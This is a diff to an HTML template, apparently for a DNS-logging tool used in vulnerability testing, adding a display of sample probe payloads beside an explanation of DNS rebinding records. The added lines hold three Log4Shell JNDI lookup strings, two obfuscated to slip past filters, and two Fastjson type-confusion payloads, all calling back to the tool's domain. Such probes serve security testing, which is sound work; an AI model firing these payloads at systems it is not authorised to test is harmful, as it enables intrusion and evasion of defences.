@@ -18,6 +18,27 @@
         <dd th:text="${data.current.value}"></dd>
     </dl>
     <dl class="dl-horizontal">
+        <dt>Log4j Payloads</dt>
+        <dd>&nbsp;</dd>
+        <dd>
+            <pre>
+${jndi:ldap://XXX.X.d.nsdemon.com}
+${${::-j}${::-n}${::-d}${::-I}:${::-l}${::-d}${::-A}${::-p}://XXX.X.d.nsdemon.com}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:-l}${lower:-d}${lower:-A}${lower:-p}://XXX.X.d.nsdemon.com}
+            </pre>
+        </dd>
+    </dl>
+    <dl class="dl-horizontal">
+        <dt>Fastjson Payloads</dt>
+        <dd>&nbsp;</dd>
+        <dd>
+            <pre>
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"XXX.X.d.nsdemon.com"}}
+{{"@type":"java.net.URL","val":"http://XXX.X.d.nsdemon.com"}:"a"}
+            </pre>
+        </dd>
+    </dl>
+    <dl class="dl-horizontal">
         <dt>rebind解析</dt>
         <dd>1、 1.1.1.1.2.2.2.2.1.dns.com即为rebind，第一次解析为1.1.1.1，第二次解析为2.2.2.2 上一次访问的ip，下一次同c段的地址都会返回rebind结果</dd>
         <dd>2、 通过配置解析处进行配置</dd>
